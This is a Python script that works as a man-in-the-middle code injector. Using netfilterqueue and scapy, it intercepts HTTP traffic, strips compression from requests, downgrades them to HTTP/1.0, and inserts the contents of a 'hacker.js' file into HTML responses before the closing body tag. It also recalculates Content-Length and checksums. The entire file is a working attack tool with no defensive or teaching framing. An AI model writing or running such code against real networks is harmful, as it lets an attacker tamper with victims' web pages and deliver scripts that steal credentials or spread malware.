#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


class CodeInjector():
    PORT = 10000
    REQUEST = 'Request'
    RESPONSE = 'Response'
    CODE_FILENAME = 'hacker.js'


    def _packet_override(self, packet, load):
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def check_packet_type(self, packet):
        if packet[scapy.TCP].dport == self.PORT:
            return self.REQUEST
        if packet[scapy.TCP].sport == self.PORT:
            return self.RESPONSE


    def change_encoding_in_request(self, packet):
        print('[+] Chaning encoding...')
        load = packet[scapy.Raw].load
        load = re.sub("Accept-Encoding: .*?\\r\\n", "", load)
        load = load.replace("HTTP/1.1", "HTTP/1.0")
        packet = self._packet_override(packet, load)
        print('[+] Changed!')
        return packet

    def inject_code(self, packet, filename):
        print('[+] Injecting code...')
        load = packet[scapy.Raw].load
        with open(filename, 'r') as code_file:
            code = code_file.read().replace('\n', '')
            load = load.replace('</body>', code + '</body>')
            print('[+] Injected!')
            return load, len(code)

    def change_content_length(self, load, additional_length):
        print('[+] Changing Content-Length')
        content_len_search = re.search("(?:Content-Length:\s)(\d*)", load)
        if content_len_search and "text/html" in load:
            content_len = content_len_search.group(1)
            content_len_new = int(content_len) + additional_length
            load = load.replace(content_len, str(content_len_new))
        print('[+] Changed!')
        return load


    def process_packet(self, packet):
        copied_hijacked_packet = scapy.IP(packet.get_payload())
        if copied_hijacked_packet.haslayer(scapy.Raw):
            packet_type = self.check_packet_type(copied_hijacked_packet)

            if packet_type == self.REQUEST:
                copied_hijacked_packet = self.change_encoding_in_request(copied_hijacked_packet)

            elif packet_type == self.RESPONSE:
                print('[+] Hijacking Response')
                changed_load, code_length = self.inject_code(copied_hijacked_packet, self.CODE_FILENAME)
                changed_load = self.change_content_length(changed_load, code_length)
                copied_hijacked_packet = self._packet_override(copied_hijacked_packet, changed_load)
                print('[+] Hijacked')
            packet.set_payload(str(copied_hijacked_packet))
            return packet, True
        return packet, False

    def process_packet_and_accept(self, packet):
        packet = self.process_packet(packet)[0]
        packet.accept()

if __name__ == '__main__':
    queue = netfilterqueue.NetfilterQueue()
    code_injector = CodeInjector()
    queue.bind(0, code_injector.process_packet_and_accept)
    queue.run()
